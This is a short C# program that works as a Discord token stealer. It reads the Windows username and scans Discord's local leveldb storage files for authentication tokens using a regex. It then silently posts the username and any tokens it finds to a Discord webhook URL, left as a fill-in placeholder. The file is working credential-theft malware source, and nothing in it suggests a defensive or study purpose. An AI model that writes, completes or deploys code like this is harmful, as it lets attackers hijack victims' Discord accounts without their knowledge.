using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace Program
{
    public static class Func
    {
        public static string[] DoIt(string file) {
            try
            {
                return File.ReadAllLines(file);
            }
            catch { return new string[0]; }
        }

    }
    class Program
    {
        static void Main()
        {
            String username = Environment.GetEnvironmentVariable("username") + '\n';
            String message = username;
            String dir = Environment.GetEnvironmentVariable("appdata") + @"\Discord\Local Storage\leveldb";
            if (Directory.Exists(dir))
            {
                string[] files = Directory.GetFiles(dir);
                Regex rgx = new Regex("[a-zA-Z0-9_-]{24}[.][a-zA-Z0-9_-]{6}[.][a-zA-Z0-9_-]{27}");
                foreach (string file in files)
                {
                    if (file.EndsWith(".log") || file.EndsWith(".ldb"))
                    {
                        String[] lines = Func.DoIt(file);
                        foreach (string line in lines)
                        {
                            Match match = rgx.Match(line);
                            if (match.Success)
                            {
                                message += match.ToString() + '\n';
                            };
                        }
                    }
                }
            }
            if (message == username)
            {
                message += "0\n";
            }
            NameValueCollection discordValues = new NameValueCollection();
            discordValues.Add("content", message);
            try
            {
                new WebClient().UploadValues("YOUR WEBHOOK LINK HERE", discordValues);
            }
            catch{}
        }
    }
}